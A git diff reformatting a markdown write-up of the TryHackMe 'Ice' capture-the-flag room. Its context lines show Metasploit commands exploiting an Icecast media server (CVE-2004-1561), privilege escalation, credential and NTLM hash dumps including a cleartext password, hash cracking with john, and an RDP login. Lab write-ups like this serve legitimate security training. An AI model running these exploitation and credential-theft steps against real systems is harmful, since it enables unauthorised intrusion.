@@ -1,11 +1,12 @@
 # Ice
-![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
+
+![tryhackme.com - © TryHackMe](<../../learn/.gitbook/assets/tryhackme-logo-small (2).png>)
 
 > 🔬🌐 [Ice](https://tryhackme.com/room/ice)
 >
-> *Deploy & hack into a Windows machine, exploiting a very poorly secured media server.*
+> _Deploy & hack into a Windows machine, exploiting a very poorly secured media server._
 >
-> ![](.gitbook/assets/ice.png)
+> <img src=".gitbook/assets/ice.png" alt="" data-size="original">
 
 🎯 Target IP: `10.10.159.9`
 
@@ -35,10 +36,8 @@ MAC Address: 02:58:8C:89:6C:3D (Unknown)
 Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-
-
-
 ## Exploitation
+
 ```bash
 msfconsole -q
 setg RHOSTS 10.10.159.9
@@ -47,8 +46,6 @@ search cve:2004-1561
 use exploit/windows/http/icecast_header
 run
 ```
-
-
 
 ### Local Enumeration
 
@@ -80,9 +77,8 @@ Meterpreter     : x86/windows
 9 exploit/windows/local/tokenmagic                 Yes The target appears to be vulnerable.
 ```
 
-
-
 ## Privilege Escalation
+
 ```bash
 background
 sessions
@@ -123,8 +119,6 @@ SeTimeZonePrivilege
 SeUndockPrivilege
 ```
 
-
-
 ## Post Exploitation
 
 ```bash
@@ -140,7 +134,6 @@ creds_all
 ```
 
 > 📌 `Dark`:`Password01!`
->
 
 ```bash
 hashdump
@@ -152,7 +145,7 @@ Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
-- Cracking (extra)
+* Cracking (extra)
 
 ```bash
 john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes_ice.txt
@@ -175,5 +168,4 @@ xfreerdp /u:Dark /p:Password01! /v:10.10.159.9
 
 ![](.gitbook/assets/image-20230510171923611.png)
 
-------
-
+***
